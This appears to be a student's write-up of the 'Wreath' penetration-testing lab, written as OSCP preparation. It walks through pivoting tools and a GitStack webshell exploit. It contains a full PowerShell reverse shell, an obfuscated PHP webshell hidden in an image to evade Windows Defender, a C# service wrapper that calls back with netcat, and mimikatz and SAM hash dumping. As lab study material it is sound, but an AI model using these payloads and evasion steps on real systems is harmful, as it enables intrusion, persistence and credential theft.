---
description: its about that time boys
---

# Wreath

Since we are encouraged to make a report and document every step, i will oblige

### Enumeration

`-p 1-15000` is used to specify a port range on nmap, `-p-` scans every single port

`etc/resolv.conf` OR `ipconfig /all` stores DNS records\
`etc/hosts` OR `C:\Windows\System32\drivers\etc\hosts` stores the hosts so if you dealing w a domain you know what to do

`id_rsa` is the PRIVATE key and thats all you need, it be in the `.ssh` folder

Try to run static binaries&#x20;

```
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

### Pivoting

#### Proxychains and Foxyproxy

Proxychains when working w CLI tools\
Activated by prepending the command `proxychains` to other commands. Reads options from `etc/proxychains.conf` however it looks for that file in pwd first so to make sure you dont mess up the master config file just cp to pwd and modify that one

<div align="left"><figure><img src=".gitbook/assets/image (69).png" alt="" width="156"><figcaption><p>Only TCP scans allowed, no ICMP also so <code>-Pn</code></p></figcaption></figure></div>

Foxyproxy for accessing webapp, you've already used it to configure burp, go for SOCKS5 cus chisel uses it SOCKS4 is default proxy type

#### SSH

```
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
ssh -D 1337 user@172.16.0.5 -fN   #create proxy, useful w proxychains
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN  #reverse shell from rhost
```

`-f` backgrounds the shell, `-N` tells ssh not to exec any commands and only set up the connection

in `-L` the local port on the left (8000), in `-R` the local port on the right (80)

#### PLink

```
puttygen KEYFILE -o OUTPUT_KEY.ppk    #only for priv key not need for pub
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

here local\_port refers to the rhost port since the command is executed from there but in the ssh one i mean our port whenever local is mentioned

#### Socat

Port forwarding machine

```
#Reverse shell
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &    #443 is our port, set a nc too

#Forwarding
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &   #3306 is of the .10 rhost and 33060 is ours

#Quiet forwarding
./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &  
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &   #on rhost
localhost:8000   #view whatever served on rhost target port

```

& backgrounds the listener\
The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it.

#### Chisel

No need for ssh access

You need a copy of chisel both in local and remote host\
Change proxychains config file to SOCKS5 instead of 4 if using this

<pre><code>#Reverse SOCKS proxy (Useful)
<strong>./chisel server -p LISTEN_PORT --reverse &#x26;                          #lhost
</strong>./chisel client ATTACKING_IP:LISTEN_PORT R:socks &#x26;

#Forward proxy (Not so useful, outbound firewall less strict so)
./chisel server -p LISTEN_PORT --socks5                             #rhost
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

#Remote port forward (connect back from a compromised target to create the forward)
./chisel server -p LISTEN_PORT --reverse &#x26;                          #localhost
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &#x26;

#Local port forward (connect from our own attacking machine to a chisel server listening on a compromised target)
./chisel server -p LISTEN_PORT                                      #rhost
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
</code></pre>

LISTEN\_PORT is the port chisel started the server in and LOCAL\_PORT is the port we wish to use to leverage access

<div align="left"><figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure></div>

#### Sshuttle

Uses an SSH connection to create a tunnelled proxy that acts like a new interface, like a VPN wo explicit proxy creation, also encrypted comms since using ssh

Need ssh access and python installed on rhost

```
sshuttle -r username@address subnet 
sshuttle -r user@172.16.0.5 172.16.0.0/24                    #use -N if don't want to specify subnet
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET   #use ssh-cmd to use key or perform any standard ssh syntax command
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5      #use -x to exclude compromised target from subnet range if show error
```

### Git Server

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can access 10.200.84.150 from our own machine w no extra setup crazy, if this wasn't there we would have to setup a proxy using proxychains or sum else

We can acess the http page directly from our browser now and redirects to a gitstacks page which has an exploit found on searchsploit

The python script also creates a PHP backdoor and allows us to pass commands&#x20;

cURL do be better than burp cus you gotta add extra headers to accept POST data

`Content-Type : application/x-www-form-urlencoded`

`curl -X POST http://10.200.84.150/web/exploit-tripz.php -d "a=systeminfo"`

Now, we can have a webshell, let's get a reverse to make it more interactive. From the whoami and other recon we know its a WIndows system so a nc reverse shell aint gonna work like that

To know if this system can interact with the internet, ping our system

```
tcpdump -i tun0 icmp        #CLI Wireshark
ping -n 3 ATTACKING_IP
```

100% packet loss

We gonna do the port forwarding and catch the shell on .200 which redirects back to our machine. Gotta open up a port first tho

```
firewall-cmd --zone=public --add-port 15555/tcp
./socatB tcp-l:15555,fork,reuseaddr tcp:10.50.85.244:1555 &
```

This is on the .200 machine and 15555 is the port we open up on it, it is forwarded to 1555 on our local machine

Running the powershell reverse shell one-line =r and URL encoding (this is a web exploit after all) we get the reverse shell

`powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

We are logged in as admin, sweet.\
To get a stronger foothold, we can create our own admin account and add it to admin user group and RDP group as well

```
net user USERNAME PASSWORD /add
net localgroup Administrators USERNAME /add
net localgroup "Remote Management Users" USERNAME /add
```

Use evil-winrm for CLI or RDP for GUI

`xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`

The drive flag allows us to load a shared drive from our local machine, that directory has a lot of sweet Windows Postex tools, one of which is mimikatz. This share is accessed by using tsclient

`\tsclient\share\mimikatz\x64\mimikatz.exe`

Now we cook, get admin credentials so we can login as Admin from now on

### Thomas' PC

`upload LOCAL_FILEPATH REMOTE_FILEPATH` & `download REMOTE_FILEPATH LOCAL_FILEPATH` is super helpful to transfer files when interacting with a Windows system.

If you want to transfer from target to local, do use an SMB server from local, connect to it and safe

`evil-winrm -u Administrator -H HASH -i IP -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/`

-s here works like share flag in xfreerdp

Invoke-Portscan.ps1 is used to do recon for our .100 machine (PC), don't forget we are still on the git server only.

After entering filename to initialize script, `Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50`

> If you followed the recommended route of using sshuttle to pivot from the webserver then a chisel forward proxy is recommended here as it will be relatively easy to connect to through the sshuttle connection without requiring a relay

Again we open up a port on the git server for pivot connection

`netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`

`./chisel.exe server -p 15555 --socks5`\
`chisel client 10.200.84.150:15555 13388:socks`

<figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

Why we doing all this again?

.200 was the public facing server and .150 only communicate to that, so we need the portal from .200 so our local machine can now comm w the .150 one.

Now the .100 machine (PC) only comms w .150 so for us to comm w PC from our local kali we need to set up another pivot

From portscan we find out ports 80 and 3389 are open, no password so RDP useless.

Configuring our foxyproxy to access the webpage

<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption><p>notice SOCKS5 and port number used</p></figcaption></figure>

and voila we can access 10.200.84.100 and it turns out to be the same webpage from .150, it was a gitserver after all so version control uses.

Use wappalyzer and identify the tech stack used, this will be helpful in finding an attack vector

Using our Win-RM access find the git directory

`C:\Gitstack\Repositories\Website.git`

Use download function to save to kali and use GitTools to extract info

`./extractor.sh /home/jtripz/Downloads/tools/Pivoting/Windows/git /home/jtripz/Downloads/tools/Pivoting/Windows/git/Website`

The .git folder we downloaded (rename it) should be in the repo directory (1st arg)

Find out which is the latest commit so only perform analysis in that.

We need php since using wappalyzer we identified that was the back end used so

`find . -name "*.php"`

Returns resources.php, analyzing the code&#x20;

```
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

The second one is simple, it splits file name based on period and if the second argument is valid file format then safe so **dune.jpg.php** works

The size parameter is only derived from actual image files so we have to embed our php shell into an image file. Anyways once uploaded and try to access, the web browser will try to read it as php only since that is the file extension.

```
$target = "uploads/".basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
```

Our file is uploaded in the uploads directory, that's where we access from

Heading to /resources

We know what to do but Windows Defender can be a pain in the ass, a standard payload from the web won't cut it.

Static detection is done by hashsum checking and byte matching, a small change to a public exploit may escape hashsum checks but when compared byte-wise, the meat of the exploit pretty much stays the same which is why we need to obfuscate our payload

Our payload can be either

```
<?php system($_GET["cmd"]);?>

<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

The second one is a bit more refined and offers clean output, now putting this in an online php obfuscator tool we get

```
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" dune2.jpg.php
```

<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell, Defender will easily identify a powershell exploit and PHP reverse shells may be unstable, the easiest option is to upload netcat. Here also we need a version different to the norm so Defender can't catch it

{% embed url="https://github.com/int0x33/nc.exe/" %}

Use python server and you get a reverse shell.

`powershell.exe c:\windows\temp\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe`

Refer the above ss, use powershell to prevent shell from exiting early

**Windows Prives you can do w obfus .exe of WinPEAS but manual always imp**

`whoami /priv`\
`whoami /groups`

`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`

Returns non core processes, one of them has unquoted service path

`sc qc SystemExplorerHelpService`

`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`

Checking if we have write perms to the unquoted path and yes we do

Time to write a service&#x20;

```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-tripz.exe", "10.50.85.244 444 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

Start a process, make a procinfo object and attach it to proc.startinfo and finally start the process

`mcs wrapper.cs`

Use SMB to transfer the compiled .exe

```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
net use \\ATTACKER_IP\share /del
```

Copy to the directory unquoted and rename to System.exe cus thats the file being called

`sc stop SystemExplorerHelpService`

`sc start SystemExplorerHelpService`

Catch the reverse shell, we are root

`reg.exe save HKLM\SAM sam.bak`

`reg.exe save HKLM\SYSTEM system.bak`

`python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`

<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption><p>dump user hashes using sam and system files</p></figcaption></figure>

### Conclusion

Miss Dubai, i love you. Let's go get this OSCP done asap.
